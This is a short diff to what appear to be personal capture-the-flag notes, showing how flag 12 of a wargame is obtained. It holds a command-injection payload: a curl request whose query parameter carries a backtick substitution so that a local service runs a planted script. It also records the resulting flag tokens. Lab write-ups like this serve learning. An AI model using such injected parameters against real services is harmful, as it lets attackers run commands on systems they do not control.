@@ -480,3 +480,19 @@ Erf nope..
 ## flag 11 : fa6v5ateaw21peobuub8ipe6s
 
 # flag 12
+
+cat /tmp/GIVEFLAG.SH
+#!/bin/bash
+
+getflag | wall
+
+curl 'http://127.0.0.1:4646/?x=`/*/giveflag.sh`'
+                                                                               
+Broadcast Message from flag12@Snow                                             
+        (somewhere) at 13:44 ...                                               
+                                                                               
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
+                                                             
+## flag : g1qKMiRpXf53AWhDaU7FEkczr
+
+# flag 13
